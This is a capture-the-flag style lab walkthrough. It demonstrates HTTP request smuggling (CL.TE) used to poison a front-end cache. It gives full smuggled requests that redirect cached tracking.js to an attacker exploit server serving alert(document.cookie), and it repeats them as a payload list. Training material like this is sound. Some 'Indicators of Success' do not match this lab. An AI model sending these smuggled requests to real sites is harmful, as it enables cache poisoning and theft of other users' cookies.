## Exploiting HTTP request smuggling to perform web cache poisoning

**Category:** request_smuggling
**Difficulty:** Unknown

### Description
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.

### Solution Steps
1. Open a blog post, click "Next post", and try smuggling the resulting request with a different Host header: POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: anything
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
2. Observe that you can use this request to make the next request to the website get redirected to /post on a host of your choice.
3. Go to your exploit server, and create a text/javascript file at /post with the contents: alert(document.cookie)
4. Poison the server cache by first relaunching the previous attack using your exploit server's hostname as follows: POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
5. Then fetch /resources/js/tracking.js by sending the following request: GET /resources/js/tracking.js HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: close If the attack has succeeded, the response to the tracking.js request should be a redirect to your exploit server.
6. Confirm that the cache has been poisoned by repeating the request to tracking.js several times and confirming that you receive the redirect every time.

### Key Payloads
- `document.cookie`
- `POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: anything
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1`
- `/post`
- `text/javascript`
- `alert(document.cookie)`
- `POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1`
- `/resources/js/tracking.js`
- `GET /resources/js/tracking.js HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: close`
- `tracking.js`

### Indicators of Success
- Request desync between front/back-end
- Subsequent request poisoned
- Other user's request captured
- Cache poisoned via smuggling
- Access controls bypassed
